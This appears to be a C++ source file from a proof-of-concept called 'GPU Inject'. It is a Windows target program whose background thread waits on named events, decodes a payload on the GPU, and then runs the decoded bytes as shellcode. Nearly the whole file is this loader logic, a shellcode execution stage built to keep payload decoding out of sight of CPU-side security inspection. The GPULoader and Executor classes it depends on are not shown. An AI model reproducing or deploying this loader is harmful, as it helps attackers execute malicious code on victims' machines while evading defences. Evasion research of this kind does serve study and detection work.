#include "GPULoader.h"
#include "Executor.h"
#include "SharedStructures.h"
#include <windows.h>
#include <iostream>
#include <thread>

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
            EndPaint(hwnd, &ps);
            return 0;
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void gpuInjectionThread() {
    LoadLibraryA("user32.dll");
    LoadLibraryA("kernel32.dll");

    HANDLE payloadReadyEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::PAYLOAD_READY_EVENT);
    HANDLE decodeCompleteEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::DECODE_COMPLETE_EVENT);
    HANDLE executionCompleteEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::EXECUTION_COMPLETE_EVENT);

    if (!payloadReadyEvent || !decodeCompleteEvent || !executionCompleteEvent) {
        std::cerr << "[target] failed to open sync events\n";
        return;
    }

    WaitForSingleObject(payloadReadyEvent, INFINITE);

    std::cout << "[target] decoding payload on gpu\n";

    GPULoader loader;
    if (!loader.initialize()) {
        std::cerr << "[target] failed to initialize gpu loader\n";
        return;
    }

    if (!loader.loadSharedGPUData()) {
        std::cerr << "[target] failed to load shared gpu data\n";
        return;
    }

    if (!loader.decodePayloadOnGPU()) {
        std::cerr << "[target] failed to decode payload\n";
        return;
    }

    std::vector<uint8_t> decodedPayload = loader.retrieveDecodedPayload();

    if (decodedPayload.empty()) {
        std::cerr << "[target] failed to retrieve payload\n";
        return;
    }

    SetEvent(decodeCompleteEvent);

    std::cout << "[target] executing payload (" << decodedPayload.size() << " bytes)\n";

    Executor executor;
    if (!executor.executeShellcode(decodedPayload)) {
        std::cerr << "[target] failed to execute shellcode\n";
        return;
    }

    SetEvent(executionCompleteEvent);

    Sleep(10000);

    CloseHandle(payloadReadyEvent);
    CloseHandle(decodeCompleteEvent);
    CloseHandle(executionCompleteEvent);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);

    const wchar_t CLASS_NAME[] = L"GPUInjectTargetWindow";

    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(
        0,
        CLASS_NAME,
        L"GPU Inject Target",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 640, 480,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );

    if (hwnd == nullptr) {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    std::thread injectionThread(gpuInjectionThread);
    injectionThread.detach();

    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
